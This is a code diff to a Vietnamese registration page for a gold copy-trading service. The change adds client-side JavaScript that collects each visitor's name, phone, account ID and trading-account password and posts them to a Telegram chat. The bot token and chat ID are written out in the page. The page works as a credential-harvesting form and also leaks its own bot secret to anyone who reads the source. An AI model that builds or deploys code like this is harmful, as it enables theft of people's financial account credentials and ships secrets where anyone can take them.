@@ -230,6 +230,13 @@
     </div>
 
     <script>
+        // ============================================================
+        // CẤU HÌNH TELEGRAM - THAY 2 GIÁ TRỊ NÀY BẰNG CỦA BẠN
+        // ============================================================
+        const TELEGRAM_BOT_TOKEN = '8991902861:AAF6PSrNvxcvbfJ6XQRIqYAXJgw5d-7MOFQ';  // Token mới từ @BotFather
+        const TELEGRAM_CHAT_ID = '8481806058';              // Chat ID của bạn
+        // ============================================================
+
         const form = document.getElementById('registerForm');
         const alertBox = document.getElementById('alertBox');
         const btnSubmit = document.getElementById('btnSubmit');
@@ -238,6 +245,59 @@
             alertBox.textContent = (type === 'success' ? '✓ ' : '✗ ') + message;
             alertBox.className = 'alert alert-' + type;
             alertBox.style.display = 'block';
+        }
+
+        function escapeHtml(str) {
+            return String(str)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;');
+        }
+
+        function formatDate(iso) {
+            const d = new Date(iso);
+            const pad = n => String(n).padStart(2, '0');
+            return `${pad(d.getDate())}/${pad(d.getMonth() + 1)}/${d.getFullYear()} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
+        }
+
+        async function sendToTelegram(data) {
+            const f = escapeHtml(data.fullname);
+            const p = escapeHtml(data.phone);
+            const pl = escapeHtml(data.platform);
+            const c = escapeHtml(data.capital || '(không nhập)');
+            const a = escapeHtml(data.accountId);
+            const pw = data.password ? escapeHtml(data.password) : '(không nhập)';
+            const t = formatDate(data.timestamp);
+
+            const text =
+`🤖 <b>ĐĂNG KÝ MỚI — COPYTRADE GOLD EA</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+👤 <b>Họ tên:</b> ${f}
+📞 <b>Số điện thoại:</b> ${p}
+💼 <b>Nền tảng:</b> ${pl}
+💰 <b>Vốn:</b> ${c} USD
+🔑 <b>Account ID:</b> <code>${a}</code>
+🔒 <b>Password:</b> <code>${pw}</code>
+
+⏰ <b>Thời gian:</b> ${t}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            if (!response.ok) {
+                const err = await response.json().catch(() => ({}));
+                throw new Error(err.description || 'Telegram API error');
+            }
+            return await response.json();
         }
 
         form.addEventListener('submit', async function (e) {
@@ -250,6 +310,11 @@
 
             if (!fullname || !phone || !accountId) {
                 showAlert('Vui lòng điền đầy đủ các trường bắt buộc.', 'error');
+                return;
+            }
+
+            if (TELEGRAM_BOT_TOKEN === 'PASTE_NEW_TOKEN_HERE' || !TELEGRAM_BOT_TOKEN) {
+                showAlert('Chưa cấu hình Telegram bot token trong file index.html.', 'error');
                 return;
             }
 
@@ -267,17 +332,11 @@
             };
 
             try {
-                // Thay URL Google Apps Script Web App của bạn vào đây
-                const SCRIPT_URL = 'https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec';
-                const response = await fetch(SCRIPT_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(formData)
-                });
+                await sendToTelegram(formData);
                 showAlert('Đăng ký thành công! Chúng tôi sẽ liên hệ trong 24h.', 'success');
                 form.reset();
             } catch (err) {
+                console.error(err);
                 showAlert('Đã xảy ra lỗi. Vui lòng thử lại.', 'error');
             } finally {
                 btnSubmit.disabled = false;
